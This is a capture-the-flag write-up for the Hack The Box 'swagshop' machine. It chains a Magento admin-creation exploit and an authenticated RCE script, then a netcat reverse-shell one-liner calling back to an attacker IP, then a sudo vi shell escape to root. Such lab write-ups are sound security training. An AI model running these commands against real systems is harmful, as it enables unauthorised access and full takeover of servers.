# 🛒 swagshop

## Enumeration

Nothing Special in nmap

We add the domain swagshop.htb and its ip in /etc/hosts

In the Website We see that its running an magento

&#x20;So we search for the exploit

and we see an remote code execution,so we add it and in script we see

```
if target.endswith("/"):
    target = target[:-1]

target_url = target + "/admin/Cms_Wysiwyg/directive/index/"

q="""
```

We check if admin page exists

Then we run the script

It created an new user with cred's forme:forme

We have also seen an authenticated code execution in the searchsploit

so we download it

In the Config part of exploit we see that we need some details from an fille "app/etc/local.xml"

So we search it and found the data needed like

changed the username and password to forme and forme, and install date to **Wed, 08 May 2019 07:23:09 +0000** (as I found in the [http://swagshop.htb/app/etc/local.xml](http://swagshop.htb/app/etc/local.xml) file)\
I ran the script:

```
python2 37811.py  whoami
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*aGfIqh63et1r9l0kFcysrQ.png" alt="" height="220" width="700"><figcaption></figcaption></figure>

It gave me this error :/\
I opened the script and started reading it

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*spUS1S5KXm-0ALwlLDPrzw.png" alt="" height="83" width="700"><figcaption></figcaption></figure>

I was having the error due to these lines. I figured it was because it was adding username control two times. I commented out this line:\
**br.form.new\_control(‘text’, ‘login\[username]’, {‘value’: username})**\
And ran the script again:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*qhKRQI0kw2i5v_N9si94vw.png" alt="" height="93" width="700"><figcaption></figcaption></figure>

It worked!\
Now, time to get a reverse shell.\
I used a one liner from [Pentestmonkey Reverse Shell Cheatsheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).\
Set up a nc listener and run this command:

```
python2 37811.py  "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.26 1234 >/tmp/f"
```

<figure><img src="https://miro.medium.com/v2/resize:fit:530/1*LDGZyhc6zCrNW25mkTbUKQ.png" alt="" height="183" width="530"><figcaption></figcaption></figure>

And I got a shell!\
Let’s stabilise it first using [socat](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/).\
Get **user.txt** from **/home/haris/user.txt**.

Now, time for some privilege escalation.\
Run **sudo -l**.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*1fg7GCiZYHFVLzbqh8UBDQ.png" alt="" height="106" width="700"><figcaption></figcaption></figure>

Great! Searching in gtfobins I found [this](https://gtfobins.github.io/gtfobins/vi/).\
I ran:

```
sudo /usr/bin/vi /var/www/html/* -c ':!/bin/sh' /dev/null
```

<figure><img src="https://miro.medium.com/v2/resize:fit:490/1*fwU4u1gx7IbgKcKcOYP26g.png" alt="" height="211" width="490"><figcaption></figcaption></figure>

And, that’s it! We are root!\
Get **root.txt** from **/root/root.txt**.

**We have successfully pwned the box!**
